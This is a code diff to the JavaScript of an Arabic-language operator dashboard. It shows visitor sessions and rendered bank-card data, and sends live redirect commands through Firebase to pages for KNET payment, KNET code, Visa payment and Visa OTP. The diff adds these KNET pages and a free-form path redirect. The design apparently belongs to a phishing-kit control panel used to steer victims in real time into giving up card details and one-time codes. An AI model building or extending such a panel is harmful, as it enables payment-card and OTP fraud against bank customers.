@@ -713,7 +713,7 @@
       })
       .map(s => s.html)
       .join('');
-    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="payment">الدفع</button><button data-ref-nav="otp">OTP</button><button data-ref-nav="finalOtp">Final OTP</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="payment">الدفع</option><option value="otp">OTP</option><option value="finalOtp">Final OTP</option></select></div><div class="ref-detail-stack">${stackSections}</div>`;
+    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="cart">سلة المشتريات</button><button data-ref-nav="knet">دفع كي نت</button><button data-ref-nav="verification">رمز كي نت</button><button data-ref-nav="card">دفع فيزا</button><button data-ref-nav="otp">رمز فيزا</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="cart">سلة المشتريات</option><option value="knet">دفع كي نت</option><option value="verification">رمز كي نت</option><option value="card">دفع فيزا</option><option value="otp">رمز فيزا</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
     els.referenceDetailEmpty.classList.add('hidden');
     if (boxCounterTimer) clearInterval(boxCounterTimer);
     els.referenceDetailContent.querySelectorAll('.bank-card').forEach((cardElement, index) => {
@@ -747,20 +747,47 @@
       navigator.clipboard.writeText(value).then(() => toast('تم نسخ: ' + value, 'success')).catch(() => toast('تعذر النسخ', 'error'));
     };
     els.referenceDetailContent.classList.remove('hidden');
-    const NAV_PAGE_MAP = { home: 'index.html', payment: 'card-payment.html', otp: 'otpcredit_card_page.html', finalOtp: 'verification.html' };
+    const NAV_PAGE_MAP = {
+      home: 'index',
+      cart: 'cartepage.html',
+      knet: 'knet.html',
+      verification: 'verification.html',
+      card: 'card-payment.html',
+      otp: 'otpcredit_card_page.html',
+    };
+    // إرسال أمر توجيه للعميل عبر RTDB commands/{sessionId}/redirect
+    // كل أمر يحمل seq فريدة لضمان تغيير القيمة دائماً (حتى لنفس الصفحة) فيستقبله العميل
+    const sendNavCommand = (prettyLabel, targetPage) => {
+      const docId = visitor.sessionId || visitor.id;
+      const cmdRef = rtd.ref('commands/' + docId + '/redirect');
+      cmdRef.set({
+        action: 'REDIRECT_PAGE',
+        targetPage: targetPage,
+        seq: Date.now() + '-' + Math.random().toString(36).slice(2, 8),
+        timestamp: new Date().toLocaleTimeString('ar-EG'),
+        adminId: 'admin',
+      }).then(() => {
+        // تحديث currentPage في Firestore للعرض فقط
+        db.collection('customers').doc(docId).set({ currentPage: prettyLabel }, { merge: true });
+        toast('تم توجيه الزائر إلى ' + prettyLabel, 'success');
+      }).catch(() => toast('تعذر توجيه الزائر', 'error'));
+    };
     els.referenceDetailContent.querySelectorAll('[data-ref-nav]').forEach(btn => btn.addEventListener('click', () => {
       const target = btn.dataset.refNav;
-      const docId = visitor.sessionId || visitor.id;
       const targetPage = NAV_PAGE_MAP[target] || target;
-      // موقع العميل يستمع لقناة RTDB commands/{sessionId}/redirect
-      // بصيغة { action: 'REDIRECT_PAGE', targetPage: 'xxx.html' } — هذا المصدر الوحيد للتوجيه
-      const cmdRef = rtd.ref('commands/' + docId + '/redirect');
-      cmdRef.set({ action: 'REDIRECT_PAGE', targetPage: targetPage, timestamp: new Date().toLocaleTimeString('ar-EG'), adminId: 'admin' }).then(() => {
-        // تحديث currentPage في Firestore للعرض فقط
-        db.collection('customers').doc(docId).set({ currentPage: target }, { merge: true });
-        toast('تم توجيه الزائر إلى ' + target, 'success');
-      }).catch(() => toast('تعذر توجيه الزائر', 'error'));
+      sendNavCommand(target, targetPage);
     }));
+    const freeInput = els.referenceDetailContent.querySelector('[data-ref-nav-free]');
+    const freeGo = els.referenceDetailContent.querySelector('[data-ref-nav-free-go]');
+    const doFreeNav = () => {
+      const raw = (freeInput.value || '').trim();
+      if (!raw) return;
+      // السماح بأي مسار يكتبه المدير (صفحة، مجلد، رابط جزئي) — يُرسل كما هو
+      sendNavCommand(raw, raw);
+      freeInput.value = '';
+    };
+    freeGo?.addEventListener('click', doFreeNav);
+    freeInput?.addEventListener('keydown', (e) => { if (e.key === 'Enter') doFreeNav(); });
     els.referenceDetailContent.querySelector('[data-ref-nav-select]')?.addEventListener('change', (e) => {
       const target = e.target.value;
       if (target) els.referenceDetailContent.querySelector(`[data-ref-nav="${target}"]`)?.click();
